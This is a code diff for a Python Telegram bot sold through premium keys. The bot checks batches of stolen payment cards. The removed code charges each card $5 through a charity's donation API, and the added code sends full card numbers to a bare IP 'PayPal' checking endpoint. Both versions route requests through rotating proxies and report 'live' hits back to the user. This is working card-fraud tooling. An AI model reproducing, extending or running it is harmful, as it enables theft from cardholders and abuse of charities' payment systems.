@@ -20,6 +20,7 @@ PROXIES = [
 
 client = TelegramClient('bot', API_ID, API_HASH)
 
+# ================== UTILITIES ==================
 async def load_json(filename):
     try:
         if not os.path.exists(filename):
@@ -49,6 +50,7 @@ async def is_premium(user_id):
     except:
         return False
 
+# ================== KEY SYSTEM ==================
 async def generate_key(days: int = 30):
     import secrets
     key = "GIVEWP-" + secrets.token_hex(8).upper()
@@ -72,67 +74,43 @@ async def redeem_key(user_id, key: str):
     await save_json(PREMIUM_FILE, premium)
     return f"✅ Success! Premium activated for {days} days."
 
-# ================== FIXED CHECKER ==================
-async def charge_5_dollars(card: str):
+# ================== CHECKER WITH FULL LOGS ==================
+async def check_card(card: str):
     current_time = datetime.now().strftime('%H:%M:%S')
-    print(f"[{current_time}] [CHECK] {card}")
+    print(f"\n[{current_time}] ===================== START ======================")
+    print(f"[{current_time}] CHECKING CARD: {card}")
 
     try:
-        cc, mm, yy, cvv = [x.strip() for x in card.split('|')]
-        if len(yy) == 2: yy = "20" + yy
-
         proxy = random.choice(PROXIES)
         proxy_url = f"http://{proxy.split(':')[2]}:{proxy.split(':')[3]}@{proxy.split(':')[0]}:{proxy.split(':')[1]}"
-        print(f"[{current_time}] [PROXY] {proxy.split(':')[0]}:{proxy.split(':')[1]}")
+        print(f"[{current_time}] PROXY USED: {proxy.split(':')[0]}:{proxy.split(':')[1]}")
 
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Content-Type': 'application/json',
-            'Accept': 'application/json'
-        }
-
-        payload = {
-            "amount": 5.00,
-            "card": {
-                "number": cc,
-                "exp_month": int(mm),
-                "exp_year": int(yy),
-                "cvc": cvv
-            }
-        }
+        url = f"http://138.128.240.15:8024/paypal_1?cc={card}"
 
         async with aiohttp.ClientSession() as session:
-            async with session.post(
-                "https://weanimals.donorsupport.co/api/donate",
-                json=payload,
-                headers=headers,
-                proxy=proxy_url,
-                timeout=40
-            ) as r:
+            async with session.get(url, proxy=proxy_url, timeout=40) as r:
                 text = await r.text()
-                print(f"[{current_time}] [STATUS] {r.status}")
-                print(f"[{current_time}] [BODY] {text[:500]}")
+                print(f"[{current_time}] STATUS CODE: {r.status}")
+                print(f"[{current_time}] RAW RESPONSE: {text[:600]}")
 
-                if r.status in (200, 201) and any(x in text.lower() for x in ["success", "approved", "thank", "charged"]):
-                    print(f"[{current_time}] [✅ LIVE]")
-                    return {"status": "Approved", "response": "Card Added (succeeded)"}
+                if r.status == 200 and any(x in text.lower() for x in ["approved", "success", "live", "charged"]):
+                    print(f"[{current_time}] ✅ LIVE HIT DETECTED!")
+                    return {"status": "Approved", "response": "PAYPAL LIVE"}
                 else:
-                    print(f"[{current_time}] [❌ DECLINED]")
+                    print(f"[{current_time}] ❌ DECLINED")
                     return {"status": "Declined", "response": "Declined"}
 
     except Exception as e:
-        print(f"[{current_time}] [ERROR] {e}")
+        print(f"[{current_time}] ❌ ERROR: {e}")
         return {"status": "Declined", "response": "Error"}
 
-async def send_approved(event, card, info):
+async def send_approved(event, card):
     msg = f"""
 **Approved ✅**
 ━━━━━━━━━━━━━
 [ϟ] 𝗖𝗖 - `{card}`
-[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : {info['response']}
-[ϟ] 𝗚𝗮𝘁𝗲 - GiveWP + Stripe
-━━━━━━━━━━━━━
-[ϟ] B𝗶𝗻 : {card[:6]}
+[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : PAYPAL LIVE
+[ϟ] 𝗚𝗮𝘁𝗲 - PayPal Donate
 ━━━━━━━━━━━━━
 """
     await event.reply(msg)
@@ -142,7 +120,7 @@ async def send_approved(event, card, info):
 async def start(event):
     if not await is_premium(event.sender_id):
         return await event.reply("**❌ No Access**\n\nSend `/key YOURKEY`")
-    await event.reply("**🔥 WeAnimals Checker**\nSend `.txt` file")
+    await event.reply("**🔥 PayPal Checker**\nSend `.txt` file")
 
 @client.on(events.NewMessage(pattern=r'(?i)^[/.]genkey(?:\s+(\d+))?$'))
 async def genkey(event):
@@ -165,7 +143,7 @@ async def txt_handler(event):
     if not event.document or not str(event.file.name).lower().endswith('.txt'):
         return
     if not await is_premium(event.sender_id):
-        return await event.reply("❌ No Access! Use /key first.")
+        return await event.reply("❌ No Access!")
 
     await event.reply("📂 Processing TXT file...")
     path = f"temp_{event.sender_id}.txt"
@@ -185,18 +163,18 @@ async def txt_handler(event):
     if not cards:
         return await event.reply("❌ No valid cards!")
 
-    await event.reply(f"✅ Found **{len(cards)}** cards. Starting...")
+    await event.reply(f"✅ Found **{len(cards)}** cards. Starting check...")
 
     for card in cards:
-        result = await charge_5_dollars(card)
+        result = await check_card(card)
         if result["status"] == "Approved":
-            await send_approved(event, card, result)
+            await send_approved(event, card)
         else:
             await event.reply(f"❌ Declined\n`{card}`")
-        await asyncio.sleep(6)
+        await asyncio.sleep(5)
 
 async def main():
-    print("🚀 Bot Started")
+    print("🚀 Bot Started - FULL LOGS MODE ENABLED")
     await client.start(bot_token=BOT_TOKEN)
     await client.run_until_disconnected()
 
